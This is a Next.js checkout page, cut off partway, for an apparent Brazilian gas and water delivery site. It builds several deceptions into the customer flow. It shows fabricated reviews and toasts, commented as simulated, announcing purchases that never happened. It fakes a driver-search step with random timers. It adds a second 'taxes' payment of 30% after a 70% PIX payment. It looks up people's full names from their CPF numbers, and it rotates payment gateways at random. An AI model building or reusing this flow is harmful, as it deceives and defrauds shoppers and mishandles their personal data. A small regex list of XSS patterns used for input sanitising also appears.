"use client"

import type React from "react"

// Declaração de tipo para gtag
declare global {
  interface Window {
    gtag: (...args: any[]) => void;
  }
}
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import LocationHeader from "@/components/LocationHeader"
import { ArrowLeft, MapPin, Clock, CreditCard, Smartphone, Copy, CheckCircle, Star, Plus, X } from "lucide-react"
import { useState, useEffect, useRef } from "react"
import { useRouter, useSearchParams } from "next/navigation"
import { getClientGateway, trackGatewayUsage, getCurrentGatewayInfo, saveSuccessfulGateway, getMappedGatewayName } from "@/lib/gateway-manager"

interface AddressData {
  cep: string
  logradouro: string
  bairro: string
  localidade: string
  uf: string
}

interface CustomerData {
  name: string
  email: string
  phone: string
  complement: string
  number: string
  cpf: string
}

interface PixResponse {
  id: number
  status: string
  amount: number
  paymentMethod: string
  paidAt?: string
  pix: {
    qrcode: string
    expirationDate: string
    end2EndId?: string
    receiptUrl?: string
  }
  customer: {
    name: string
    email: string
    phone: string
  }
  items: Array<{
    title: string
    quantity: number
    unitPrice: number
  }>
}

// Função para sanitizar inputs e prevenir XSS
const sanitizeInput = (input: string, allowSpaces: boolean = false): string => {
  // Remove tags HTML, scripts e caracteres perigosos
  let sanitized = input
    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
    .replace(/<[^>]*>/g, '')
    .replace(/javascript:/gi, '')
    .replace(/on\w+\s*=/gi, '')
    .replace(/[<>'"]/g, '')
  
  // Se não permitir espaços, remove todos os espaços
  if (!allowSpaces) {
    sanitized = sanitized.replace(/\s+/g, '')
  } else {
    // Se permitir espaços, apenas normaliza espaços múltiplos para um único espaço
    sanitized = sanitized.replace(/\s{2,}/g, ' ')
  }
  
  // Não usar trim() para permitir espaços durante digitação
  return sanitized
}

// Função para validar se input contém código malicioso
const isInputSafe = (input: string): boolean => {
  const dangerousPatterns = [
    /<script/i,
    /javascript:/i,
    /on\w+\s*=/i,
    /<iframe/i,
    /<object/i,
    /<embed/i,
    /eval\(/i,
    /expression\(/i
  ]
  
  return !dangerousPatterns.some(pattern => pattern.test(input))
}

// Funções auxiliares de formatação
const formatCep = (value: string) => {
  const cleanValue = value.replace(/\D/g, "")
  if (cleanValue.length <= 8) {
    return cleanValue.replace(/(\d{5})(\d{3})/, "$1-$2")
  }
  return value
}

const formatPhone = (value: string) => {
  if (!value) return ""
  const cleanValue = value.replace(/\D/g, "")
  if (cleanValue.length <= 11) {
    return cleanValue.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3")
  }
  return value
}

const formatCPF = (value: string) => {
  if (!value) return ""
  const cleanValue = value.replace(/\D/g, "")
  if (cleanValue.length <= 11) {
    return cleanValue.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
  }
  return value
}

const formatCurrency = (value: number) => {
  return new Intl.NumberFormat('pt-BR', {
    style: 'currency',
    currency: 'BRL'
  }).format(value / 100)
}

export default function CheckoutPage() {
  const router = useRouter()
  const searchParams = useSearchParams()
  const productName = searchParams.get("product") || "Produto"
  
  // Estado para armazenar IP do usuário
  const [userIp, setUserIp] = useState<string>("0.0.0.0")
  
  // Capturar IP do usuário
  useEffect(() => {
    const fetchIp = async () => {
      try {
        const response = await fetch('https://api.ipify.org?format=json')
        const data = await response.json()
        setUserIp(data.ip)
        console.log('📍 [IP] IP do usuário capturado:', data.ip)
      } catch (error) {
        console.error('❌ [IP] Erro ao capturar IP:', error)
      }
    }
    fetchIp()
  }, [])
  
  // Capturar parâmetros UTM da URL ao carregar a página
  useEffect(() => {
    const utmParams = {
      src: searchParams.get('src'),
      sck: searchParams.get('sck'),
      utm_source: searchParams.get('utm_source'),
      utm_campaign: searchParams.get('utm_campaign'),
      utm_medium: searchParams.get('utm_medium'),
      utm_content: searchParams.get('utm_content'),
      utm_term: searchParams.get('utm_term'),
      keyword: searchParams.get('keyword'),
      device: searchParams.get('device'),
      network: searchParams.get('network'),
      gclid: searchParams.get('gclid'),
      gbraid: searchParams.get('gbraid'),
      wbraid: searchParams.get('wbraid'),
      fbclid: searchParams.get('fbclid')
    }
    
    // Salvar parâmetros UTM se existirem
    if (Object.values(utmParams).some(val => val !== null)) {
      localStorage.setItem('utm-params', JSON.stringify(utmParams))
      console.log('📊 [UTM] Parâmetros capturados e salvos:', utmParams)
    } else {
      console.log('⚠️ [UTM] Nenhum parâmetro UTM encontrado na URL')
    }
  }, [])

  // Verificar se já existe um pagamento confirmado ou PIX pendente no localStorage
  useEffect(() => {
    const savedPayment = localStorage.getItem('paid-order')
    if (savedPayment) {
      try {
        const payment = JSON.parse(savedPayment)
        // Verificar se o pagamento é recente (últimas 24 horas)
        const paymentTime = new Date(payment.paidAt).getTime()
        const now = new Date().getTime()
        const hoursDiff = (now - paymentTime) / (1000 * 60 * 60)
        
        if (hoursDiff < 24) {
          // Verificar se é produto de gás e se já pagou os 70% mas ainda não gerou o PIX de 30%
          const isGas = payment.pixData?.items?.[0]?.title?.toLowerCase().includes('gás') || 
                        payment.pixData?.items?.[0]?.title?.toLowerCase().includes('botijão')
          const hasTaxPix = localStorage.getItem('tax-pix-transaction')
          
          if (isGas && !hasTaxPix) {
            // Pagou 70% mas ainda não gerou o PIX de 30%
            console.log('🔔 DETECTADO: Pagamento de 70% completo, falta pagar 30%')
            setPixData(payment.pixData)
            setCustomerData(payment.customerData)
            setAddressData(payment.addressData)
            setFirstPaymentCompleted(true)
            setStep(3)
            // Mostrar modal para gerar PIX dos impostos
            setTimeout(() => {
              console.log('🎯 Abrindo modal de impostos...')
              setShowTaxPaymentModal(true)
            }, 500)
          } else {
            // Restaurar dados do pagamento normalmente
            setPixData(payment.pixData)
            setCustomerData(payment.customerData)
            setAddressData(payment.addressData)
            setStep(3)
          }
        } else {
          // Limpar pagamento antigo
          localStorage.removeItem('paid-order')
        }
      } catch (e) {
        localStorage.removeItem('paid-order')
      }
    } else {
      // Verificar se há PIX de impostos (30%) pendente
      const pendingTaxPix = localStorage.getItem('tax-pix-transaction')
      if (pendingTaxPix) {
        try {
          const transaction = JSON.parse(pendingTaxPix)
          const pixData = transaction.pixData
          
          // Verificar se é recente (últimas 2 horas)
          const createdAt = new Date(pixData.createdAt || Date.now()).getTime()
          const now = Date.now()
          const hoursDiff = (now - createdAt) / (1000 * 60 * 60)
          
          if (hoursDiff < 2 && pixData.status !== 'paid' && pixData.status !== 'PAID') {
            // Restaurar para continuar pagamento dos impostos
            setTaxPixData(pixData)
            setCustomerData(transaction.customerData)
            setAddressData(transaction.addressData)
            setFirstPaymentCompleted(true)
            setStep(3)
            // Iniciar polling do segundo PIX
            startPaymentPolling(pixData.id)
          } else {
            // Limpar PIX antigo
            localStorage.removeItem('tax-pix-transaction')
            localStorage.removeItem('utmify-tax-payload')
          }
        } catch (e) {
          localStorage.removeItem('tax-pix-transaction')
          localStorage.removeItem('utmify-tax-payload')
        }
      } else {
        // Verificar se há PIX pendente (não pago) - primeiro pagamento
        const pendingPix = localStorage.getItem('current-pix-transaction')
        if (pendingPix) {
          try {
            const transaction = JSON.parse(pendingPix)
            const pixData = transaction.pixData
            
            // Verificar se é recente (últimas 2 horas)
            const createdAt = new Date(pixData.createdAt || Date.now()).getTime()
            const now = Date.now()
            const hoursDiff = (now - createdAt) / (1000 * 60 * 60)
            
            if (hoursDiff < 2 && pixData.status !== 'paid' && pixData.status !== 'PAID') {
              console.log('🔄 [RESTORE] PIX pendente encontrado:', {
                id: pixData.id,
                amount: pixData.amount,
                status: pixData.status,
                createdAt: pixData.createdAt
              })
              // Restaurar PIX pendente diretamente
              setPixData(pixData)
              setCustomerData(transaction.customerData)
              setAddressData(transaction.addressData)
              setStep(3)
              // Iniciar polling
              startPaymentPolling(pixData.id)
              console.log('✅ [RESTORE] PIX restaurado e polling iniciado')
            } else {
              console.log('⏰ [RESTORE] PIX muito antigo, limpando...')
              // Limpar PIX antigo
              localStorage.removeItem('current-pix-transaction')
            }
          } catch (e) {
            localStorage.removeItem('current-pix-transaction')
          }
        }
      }
    }
  }, [])

  const productPrices: { [key: string]: number } = {
    "TESTE - Produto R$ 5": 500, // R$ 5,00 em centavos - PRODUTO DE TESTE
    "Gás de cozinha 13 kg (P13)": 8870, // R$ 88,70 em centavos (COM botijão)
    "Gás de Cozinha 13kg": 8870, // R$ 88,70 em centavos (compatibilidade)
    "Água Mineral Indaiá 20L": 1283, // R$ 12,83 em centavos
    "Garrafão de água Mineral 20L": 2920, // R$ 29,20 em centavos (COM vasilhame completo)
    "Água Mineral Serragrande 20L": 2783, // R$ 27,83 em centavos
    "Botijão de Gás 8kg P8": 7553, // R$ 75,53 em centavos (COM botijão)
    "Botijão de Gás 8kg": 7453, // R$ 74,53 em centavos (compatibilidade)
    "3 Garrafões de Água 20L": 5840, // R$ 58,40 em centavos (COM vasilhames)
    "Combo 2 Botijões de Gás 13kg": 13990, // R$ 139,90 em centavos (COM botijões)
    "Combo Gás + Garrafão": 10320, // R$ 103,20 em centavos
    "Combo 3 Gás 13kg": 20900, // R$ 209,00 em centavos (3x Gás 13kg COM botijões)
    "Combo 2 Gás + 2 Água": 18680, // R$ 186,80 em centavos (2x Gás 13kg + 2x Água 20L)
    "Combo 2 Gás + 1 Água": 15760, // R$ 157,60 em centavos (2x Gás 13kg + 1x Água 20L)
  }

  const [addressData, setAddressData] = useState<AddressData | null>(null)
  const [cep, setCep] = useState("")
  const [customerData, setCustomerData] = useState<CustomerData>({
    name: "",
    email: "",
    phone: "",
    complement: "",
    number: "",
    cpf: "",
  })
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState("")
  const [step, setStep] = useState(1) // 1: CEP, 2: Dados, 3: PIX
  const [pixData, setPixData] = useState<PixResponse | null>(null)
  const [pixLoading, setPixLoading] = useState(false)
  const [pixError, setPixError] = useState("")
  const [copied, setCopied] = useState(false)
  const [kitMangueira, setKitMangueira] = useState(false)
  const [showToast, setShowToast] = useState(false)
  const [currentToast, setCurrentToast] = useState("")
  const [conversionReported, setConversionReported] = useState(false)
  const [selectedWaterBrand, setSelectedWaterBrand] = useState("Naturágua")
  const [selectedGasBrand, setSelectedGasBrand] = useState("Liquigas")
  const [pixTimer, setPixTimer] = useState(900) // 15 minutos em segundos
  const [utmifySent, setUtmifySent] = useState(() => {
    // Recuperar do localStorage se existir
    if (typeof window !== 'undefined') {
      const saved = localStorage.getItem('utmify-sent')
      if (saved) {
        try {
          return JSON.parse(saved)
        } catch (e) {
          return { pending: false, paid: false }
        }
      }
    }
    return { pending: false, paid: false }
  })
  const [utmifyPayload, setUtmifyPayload] = useState<any>(null) // Guardar payload do pending
  const [pollingInterval, setPollingInterval] = useState<NodeJS.Timeout | null>(null)
  const [showPixDiscountModal, setShowPixDiscountModal] = useState(false)
  const [pixDiscount, setPixDiscount] = useState(0)
  const [smsReminderSent, setSmsReminderSent] = useState(false)
  const [showSupportButton, setShowSupportButton] = useState(false)
  const [showCardForm, setShowCardForm] = useState(false)
  const [cardData, setCardData] = useState({
    cardNumber: '',
    cardHolderName: '',
    cardExpiryDate: '',
    cardCvv: ''
  })
  const [cardSubmitting, setCardSubmitting] = useState(false)
  const [cardLoadingMessage, setCardLoadingMessage] = useState('Processando pagamento...')
  const [cardFailed, setCardFailed] = useState(false)
  const [showAddressModal, setShowAddressModal] = useState(false)
  const [searchingDriver, setSearchingDriver] = useState(false)
  const [driverETA, setDriverETA] = useState<string | null>(null)
  const [showPendingPixModal, setShowPendingPixModal] = useState(false)
  const [pendingPixData, setPendingPixData] = useState<any>(null)
  const [showTaxPaymentModal, setShowTaxPaymentModal] = useState(false)
  const [firstPaymentCompleted, setFirstPaymentCompleted] = useState(false)
  const [taxPixData, setTaxPixData] = useState<any>(null)
  const [showUpsellModal, setShowUpsellModal] = useState(false)
  const qrCodeRef = useRef<HTMLDivElement>(null)
  const paymentExplanationRef = useRef<HTMLDivElement>(null)
  const driverFoundRef = useRef<HTMLDivElement>(null)
  const [cpfCheck, setCpfCheck] = useState('')
  const [cpfCheckLoading, setCpfCheckLoading] = useState(false)
  const [cpfCheckError, setCpfCheckError] = useState('')
  const [customerFound, setCustomerFound] = useState<any>(null)
  const [discountApproved, setDiscountApproved] = useState(false)
  const [showDiscountModal, setShowDiscountModal] = useState(false)

  // Marcas de água disponíveis
  const waterBrands = [
    "Naturágua",
    "Indaiá", 
    "Serra Grande",
    "Límpida",
    "Santa Sofia",
    "Pacoti",
    "Marilia",
    "Neblina",
    "Sagrada",
    "Litoragua"
  ]

  // Marcas de gás disponíveis
  const gasBrands = [
    "Copagaz",
    "Nacional Gás",
    "Liquigas", 
    "Ultragas",
    "SupergasBras"
  ]

  // Função para gerar preço extra aleatório (R$ 1,00 a R$ 5,99)
  const generateExtraPrice = (brandName: string) => {
    // Usar o nome da marca como seed para gerar sempre o mesmo valor
    let hash = 0
    for (let i = 0; i < brandName.length; i++) {
      hash = brandName.charCodeAt(i) + ((hash << 5) - hash)
    }
    const random = Math.abs(hash % 500) / 100 // 0.00 a 4.99
    return Math.round((1 + random) * 100) / 100 // R$ 1,00 a R$ 5,99
  }

  // Função para formatar preço extra
  const formatExtraPrice = (extra: number) => {
    return `+R$ ${extra.toFixed(2).replace('.', ',')}`
  }

  // Dados dos reviews
  const reviews = [
    {
      name: "Patricia Almeida",
      rating: 5,
      comment: "Melhor serviço de entrega que já usei! Chegou antes do esperado e o gás veio lacrado. Muito satisfeita!",
      image: "/reviews/review1.jpg",
      product: "Gás P13"
    },
    {
      name: "Ricardo Ferreira",
      rating: 5,
      comment: "Impressionante a rapidez! Pedi e em menos de 20 minutos estava na minha porta. Atendimento excelente!",
      image: "/reviews/reviewGasInstalado.jpg",
      product: "Gás P13 + Kit Mangueira"
    },
    {
      name: "Juliana Martins",
      rating: 5,
      comment: "Economia garantida com o combo! Botijões novos e preço justo. Já indiquei para toda família!",
      image: "/reviews/reviewcombo2Botijao.jpg",
      product: "Combo 2 Botijões"
    },
    {
      name: "Eduardo Souza",
      rating: 5,
      comment: "Água de primeira qualidade! Garrafões lacrados e entrega super rápida. Não troco mais!",
      image: "/reviews/review3garrafoes.jpg",
      product: "3 Garrafões"
    },
    {
      name: "Camila Rodrigues",
      rating: 5,
      comment: "Que praticidade! Pedi pelo celular e em meia hora estava aqui. Entregador muito educado. Adorei!",
      image: "/reviews/review2.jpg",
      product: "Água Mineral"
    },
    {
      name: "Marcos Pereira",
      rating: 5,
      comment: "Serviço impecável do início ao fim! Gás de qualidade, entrega rápida e preço justo. Recomendo demais!",
      image: "/reviews/review3.jpg",
      product: "Gás P13"
    }
  ]

  // Mensagens de toast para simular compras
  const toastMessages = [
    "Patricia de Belo Horizonte acabou de comprar 1 Gás P13",
    "Ricardo de Contagem acabou de comprar o Combo 2 Botijões",
    "Juliana de Betim acabou de comprar 3 Garrafões de Água",
    "Eduardo de Nova Lima acabou de comprar 1 Garrafão de Água",
    "Camila de Sabará acabou de comprar o Combo Gás + Garrafão",
    "Marcos de Ribeirão das Neves acabou de comprar 1 Gás P13"
  ]

  useEffect(() => {
    // Verificar se já tem dados do CEP no localStorage
    const savedAddress = localStorage.getItem("configas-address")
    if (savedAddress) {
      const parsedAddress = JSON.parse(savedAddress)
      setAddressData(parsedAddress)
      setCep(parsedAddress.cep)
      setStep(2)
    }
    
    // Carregar dados do cliente salvos
    const savedCustomer = localStorage.getItem("configas-customer")
    if (savedCustomer) {
      try {
        const parsedCustomer = JSON.parse(savedCustomer)
        setCustomerData(parsedCustomer)
        console.log('✅ Dados do cliente carregados do localStorage')
      } catch (error) {
        console.error('❌ Erro ao carregar dados do cliente:', error)
      }
    }
  }, [])

  // Toast de compras em tempo real
  useEffect(() => {
    const showRandomToast = () => {
      const randomMessage = toastMessages[Math.floor(Math.random() * toastMessages.length)]
      setCurrentToast(randomMessage)
      setShowToast(true)
      
      setTimeout(() => {
        setShowToast(false)
      }, 4000)
    }

    // Mostrar primeiro toast após 3 segundos
    const firstTimeout = setTimeout(showRandomToast, 3000)
    
    // Depois mostrar a cada 15-25 segundos
    const interval = setInterval(() => {
      showRandomToast()
    }, Math.random() * 10000 + 15000) // 15-25 segundos

    return () => {
      clearTimeout(firstTimeout)
      clearInterval(interval)
    }
  }, [])

  const fetchAddressData = async (cepValue: string) => {
    setLoading(true)
    setError("")

    try {
      const cleanCep = cepValue.replace(/\D/g, "")
      if (cleanCep.length !== 8) {
        setError("CEP deve ter 8 dígitos")
        return
      }

      const response = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`)
      const data = await response.json()

      if (data.erro) {
        setError("CEP não encontrado")
        return
      }

      setAddressData(data)
      localStorage.setItem("configas-address", JSON.stringify(data))
      // Abrir modal de confirmação de endereço
      setShowAddressModal(true)
    } catch (err) {
      setError("Erro ao buscar CEP")
    } finally {
      setLoading(false)
    }
  }

  const handleCepSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!cep) return

    setLoading(true)
    setError("")

    try {
      const cleanCep = cep.replace(/\D/g, "")
      if (cleanCep.length !== 8) {
        setError("CEP deve ter 8 dígitos")
        return
      }

      const response = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`)
      const data = await response.json()

      if (data.erro) {
        setError("CEP não encontrado")
        return
      }

      setAddressData(data)
      // Salvar endereço no localStorage
      localStorage.setItem("configas-address", JSON.stringify(data))
      // Abrir modal de confirmação de endereço
      setShowAddressModal(true)
    } catch (err) {
      setError("Erro ao buscar CEP")
    } finally {
      setLoading(false)
    }
  }
  
  // Função para confirmar endereço no modal
  const confirmAddress = () => {
    setShowAddressModal(false)
    setStep(2)
    // Abrir modal de desconto exclusivo
    setShowDiscountModal(true)
  }

  // Função para continuar com PIX pendente
  const continuePendingPix = () => {
    if (pendingPixData) {
      setPixData(pendingPixData.pixData)
      setCustomerData(pendingPixData.customerData)
      setAddressData(pendingPixData.addressData)
      setStep(3)
      setShowPendingPixModal(false)
      // Iniciar polling
      startPaymentPolling(pendingPixData.pixData.id)
    }
  }

  // Função para começar novo pedido
  const startNewOrder = () => {
    localStorage.removeItem('current-pix-transaction')
    localStorage.removeItem('utmify-payload')
    localStorage.removeItem('utmify-sent')
    setShowPendingPixModal(false)
    setPendingPixData(null)
    setStep(1)
  }

  // Função helper para salvar dados do cliente no localStorage
  const saveCustomerData = (data: CustomerData) => {
    try {
      localStorage.setItem("configas-customer", JSON.stringify(data))
    } catch (error) {
      console.error('❌ Erro ao salvar dados do cliente:', error)
    }
  }

  const handleCustomerDataSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (customerData.name && customerData.email && customerData.phone && customerData.number) {
      // Salvar dados do cliente no localStorage
      saveCustomerData(customerData)
      // Ir para Step 3
      setStep(3)
    }
  }
  
  // Função para simular busca de motoboy
  const startDriverSearch = () => {
    setSearchingDriver(true)
    setDriverETA(null)
    
    // Tempo aleatório entre 10-30 segundos para "encontrar" motoboy
    const searchTime = Math.random() * 20000 + 10000 // 10-30 segundos
    
    setTimeout(() => {
      setSearchingDriver(false)
      // Tempo de chegada aleatório entre 5-15 minutos
      const etaMinutes = Math.floor(Math.random() * 11) + 5 // 5-15 minutos
      setDriverETA(`${etaMinutes} minutos`)
      
      // Focar na mensagem de entregador encontrado
      setTimeout(() => {
        if (driverFoundRef.current) {
          driverFoundRef.current.scrollIntoView({ behavior: 'smooth', block: 'center' })
        }
        
        // Após 3 segundos focado no entregador, faz scroll para o QR code
        setTimeout(() => {
          if (qrCodeRef.current) {
            qrCodeRef.current.scrollIntoView({ behavior: 'smooth', block: 'center' })
          }
        }, 3000)
      }, 500)
    }, searchTime)
  }
  
  // Função para verificar CPF na API
  const checkCpfDiscount = async () => {
    setCpfCheckLoading(true)
    setCpfCheckError('')
    
    try {
      // Validar se cpfCheck existe
      if (!cpfCheck || cpfCheck.trim() === '') {
        setCpfCheckError('Por favor, digite um CPF')
        setCpfCheckLoading(false)
        return
      }
      
      const cleanCpf = cpfCheck.replace(/\D/g, '')
      if (cleanCpf.length !== 11) {
        setCpfCheckError('CPF deve ter 11 dígitos')
        setCpfCheckLoading(false)
        return
      }
      
      // Usar API interna para não expor URL externa
      const response = await fetch('/api/check-cpf', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ cpf: cleanCpf })
      })
      
      if (!response.ok) {
        setCpfCheckError('Erro ao verificar CPF. Tente novamente.')
        setCpfCheckLoading(false)
        return
      }
      
      const data = await response.json()
      
      if (data.found && data.nomeCompleto) {
        // Cliente encontrado - aplicar desconto
        setCustomerFound({ nomeCompleto: data.nomeCompleto })
        setDiscountApproved(true)
        
        // Calcular e aplicar desconto de 10%
        const discount = Math.round(getTotalPrice() * 0.10)
        setPixDiscount(discount)
        
        // Preencher nome e CPF automaticamente
        setCustomerData(prev => ({ 
          ...prev, 
          name: data.nomeCompleto,
          cpf: cpfCheck 
        }))
        // Fechar modal de desconto
        setShowDiscountModal(false)
        // Fazer scroll para o card de explicação do pagamento após 500ms
        setTimeout(() => {
          if (paymentExplanationRef.current) {
            paymentExplanationRef.current.scrollIntoView({ behavior: 'smooth', block: 'center' })
          }
        }, 500)
      } else {
        setCpfCheckError('CPF não encontrado em nossa base de clientes')
      }
    } catch (err) {
      setCpfCheckError('Erro ao verificar CPF. Tente novamente.')
    } finally {
      setCpfCheckLoading(false)
    }
  }

  // Função para pular verificação de desconto
  const skipDiscountCheck = () => {
    setShowDiscountModal(false)
    // Fazer scroll para o card de explicação do pagamento após 300ms
    if (isGasProduct()) {
      setTimeout(() => {
        if (paymentExplanationRef.current) {
          paymentExplanationRef.current.scrollIntoView({ behavior: 'smooth', block: 'center' })
        }
      }, 300)
    }
  }

  const handleAcceptDiscount = () => {
    setShowPixDiscountModal(false)
    // Calcular e aplicar desconto de 10%
    const discount = Math.round(getTotalPrice() * 0.10)
    setPixDiscount(discount)
    // Gerar PIX enquanto mostra loading de busca do motoboy
    generatePix(true)
  }
  
  const handleDeclineDiscount = () => {
    setShowPixDiscountModal(false)
    setShowCardForm(true)
  }

  // Função DEBUG - Gerar PIX simulado (apenas localhost)
  const generateSimulatedPix = () => {
    console.log('🧪 GERANDO PIX SIMULADO (DEBUG)...')
    setShowPixDiscountModal(false)
    
    // Calcular e aplicar desconto de 10%
    const discount = Math.round(getTotalPrice() * 0.10)
    setPixDiscount(discount)
    
    const paymentAmount = getFirstPaymentAmount()
    
    // Criar PIX simulado
    const simulatedPix: any = {
      id: Math.floor(Math.random() * 1000000),
      status: 'pending',
      amount: paymentAmount,
      createdAt: new Date().toISOString(),
      paymentMethod: 'pix',
      customer: {
        name: customerData.name,
        email: customerData.email,
        cpf: customerData.cpf.replace(/\D/g, ''),
        phone: customerData.phone.replace(/\D/g, '')
      },
      pix: {
        qrcode: 'SIMULADO_' + Math.random().toString(36).substring(7).toUpperCase(),
        qrcodeUrl: 'https://example.com/qrcode-simulado'
      },
      items: [{
        title: requiresSplitPayment() ? `${productName} - Primeira Parte (70%)` : productName,
        quantity: 1,
        unitPrice: paymentAmount
      }]
    }
    
    console.log('✅ PIX simulado gerado:', simulatedPix)
    setPixData(simulatedPix)
    
    // Salvar no localStorage
    localStorage.setItem('current-pix-transaction', JSON.stringify({
      pixData: simulatedPix,
      customerData,
      addressData,
      createdAt: new Date().toISOString()
    }))
    
    console.log('💾 PIX simulado salvo no localStorage')
  }

  const generatePix = async (applyDiscount: boolean = false) => {
    console.log('🚀 [GeneratePix] Iniciando geração de PIX...')
    console.log('📊 [GeneratePix] Parâmetros:', { applyDiscount, pixDiscount, discountApproved })
    
    setPixLoading(true)
    setPixError("")
    
    // Resetar estado UTMify para novo pedido
    setUtmifySent({ pending: false, paid: false })
    localStorage.removeItem('utmify-sent')
    localStorage.removeItem('paid-order')

    try {
      let totalPrice = getTotalPrice()
      let productPrice = productPrices[productName] || 1000
      let kitPrice = kitMangueira ? 980 : 0
      
      // Aplicar desconto de 10% se:
      // 1. Cliente foi aprovado (discountApproved) OU
      // 2. Já existe desconto aplicado do cartão (pixDiscount > 0)
      if (discountApproved || pixDiscount > 0) {
        let discount = pixDiscount
        if (discountApproved && pixDiscount === 0) {
          discount = Math.round(totalPrice * 0.10)
          setPixDiscount(discount)
        }
        totalPrice = totalPrice - discount
        
        // Aplicar desconto proporcionalmente aos items
        productPrice = Math.round(productPrice * 0.90)
        if (kitMangueira) {
          kitPrice = Math.round(kitPrice * 0.90)
        }
      }
      
      // Cobrar 70% para gás (primeira parte), 100% para outros produtos
      let pixAmount = totalPrice
      if (requiresSplitPayment()) {
        pixAmount = Math.round(totalPrice * 0.70) // 70% para gás
      }
      
      let productTitle = productName
      
      if (isWaterProduct() && selectedWaterBrand) {
        productTitle = `${productName} - Marca: ${selectedWaterBrand}`
      } else if (isGasProduct() && selectedGasBrand) {
        productTitle = `${productName} - Marca: ${selectedGasBrand}`
      }
      
      // Adicionar informação de desconto no título se aplicado
      if (applyDiscount) {
        productTitle += " (10% desconto PIX)"
      }
        
      const items = [
        {
          title: productTitle,
          unitPrice: productPrice,
          tangible: true,
          quantity: 1,
        }
      ]

      // Adicionar kit mangueira se selecionado
      if (kitMangueira) {
        items.push({
          title: applyDiscount ? "Kit Mangueira para Gás (10% desconto PIX)" : "Kit Mangueira para Gás",
          unitPrice: kitPrice,
          tangible: true,
          quantity: 1,
        })
      }

      // Definir código do produto baseado no tipo
      let productCode = "ProdNewGB" // Padrão: Gás + Botijão
      if (productName.includes("Combo")) {
        productCode = "ProdNewCB" // Combo
      } else if (productName.includes("Garrafão")) {
        productCode = "ProdNewGA" // Garrafão
      }

      // Recuperar UTMs do localStorage
      const savedUtms = localStorage.getItem('utm-params')
      const utmData = savedUtms ? JSON.parse(savedUtms) : {}

      const requestData = {
        amount: pixAmount, // 🔥 Usar pixAmount (50% se parcelado) ao invés de totalPrice
        currency: "BRL",
        paymentMethod: "PIX",
        customer: {
          name: customerData.name,
          email: customerData.email,
          document: {
            number: customerData.cpf.replace(/\D/g, ""),
            type: "CPF",
          },
          phone: customerData.phone.replace(/\D/g, ""),
          externalRef: "",
          address: {
            street: addressData?.logradouro || "",
            streetNumber: customerData.number,
            complement: customerData.complement || "",
            zipCode: addressData?.cep.replace(/\D/g, "") || "",
            neighborhood: addressData?.bairro || "",
            city: addressData?.localidade || "",
            state: addressData?.uf || "",
            country: "br",
          },
        },
        shipping: {
          fee: 0,
          address: {
            street: addressData?.logradouro || "",
            streetNumber: customerData.number,
            complement: customerData.complement || "",
            zipCode: addressData?.cep.replace(/\D/g, "") || "",
            neighborhood: addressData?.bairro || "",
            city: addressData?.localidade || "",
            state: addressData?.uf || "",
            country: "br",
          },
        },
        items: [{
          title: productCode,
          unitPrice: getPaymentAmount(), // Usar valor calculado (50% ou 100%)
          quantity: 1,
          tangible: true,
          externalRef: "",
        }],
        pix: {
          expiresInDays: 1,
        },
        postbackUrl: "",
        metadata: JSON.stringify({
          source: "apiutmify",
          project: productCode,
          url: "gasbu",
          pixelId: "",
          timestamp: new Date().toISOString(),
          // Adicionar UTMs no metadata para recuperar no webhook
          trackingParameters: {
            src: utmData.src || null,
            sck: utmData.sck || null,
            utm_source: utmData.utm_source || null,
            utm_campaign: utmData.utm_campaign || null,
            utm_medium: utmData.utm_medium || null,
            utm_content: utmData.utm_content || null,
            utm_term: utmData.utm_term || null,
            gclid: utmData.gclid || null,
            gbraid: utmData.gbraid || null,
            wbraid: utmData.wbraid || null,
            fbclid: utmData.fbclid || null,
            keyword: utmData.keyword || null,
            device: utmData.device || null,
            network: utmData.network || null
          }
        }),
        traceable: true,
        ip: userIp,
      }

      // Obter gateway selecionado aleatoriamente para este cliente
      const gateway = getClientGateway()
      const mappedName = getMappedGatewayName(gateway.id)
      console.log(`🎯 [Gateway] Usando: ${mappedName}`)
      console.log(`📡 [GeneratePix] Endpoint: ${gateway.endpoint}`)
      console.log(`💰 [GeneratePix] Valor total: ${totalPrice}`)
      console.log(`💳 [GeneratePix] Valor PIX (70%): ${pixAmount}`)
      console.log(`📦 [GeneratePix] Produto: ${productCode}`)
      
      // Rastrear uso do gateway
      trackGatewayUsage(gateway.id)

      console.log('📤 [GeneratePix] Enviando requisição...')
      const response = await fetch(gateway.endpoint, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(requestData),
      })
      
      console.log(`📥 [GeneratePix] Resposta recebida: ${response.status} ${response.statusText}`)

      if (!response.ok) {
        const errorText = await response.text()
        console.error('❌ [GeneratePix] Erro na resposta:', errorText)
        throw new Error("Erro ao gerar PIX")
      }

      const pixResponse: PixResponse = await response.json()
      console.log('✅ [GeneratePix] PIX gerado com sucesso! ID:', pixResponse.id)
      
      // ✅ SALVAR GATEWAY APENAS APÓS SUCESSO
      saveSuccessfulGateway(gateway.id)
      
      setPixData(pixResponse)
      
      // Salvar dados do PIX no localStorage para usar no polling
      localStorage.setItem('current-pix-transaction', JSON.stringify({
        pixData: pixResponse,
        customerData,
        addressData,
        createdAt: new Date().toISOString()
      }))
      
      // Salvar dados do pedido no arquivo para o webhook usar
      try {
        const utmParamsStr = localStorage.getItem('utm-params')
        const utmParams = utmParamsStr ? JSON.parse(utmParamsStr) : {}
        
        await fetch('/api/save-order-data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            orderId: pixResponse.id.toString(),
            customer: {
              name: customerData.name,
              email: customerData.email,
              phone: customerData.phone.replace(/\D/g, ''),
              document: customerData.cpf.replace(/\D/g, ''),
              country: "BR",
              city: addressData?.localidade || '',
              ip: ''
            },
            products: pixResponse.items?.map((item: any, index: number) => ({
              id: `product-${pixResponse.id}-${index}`,
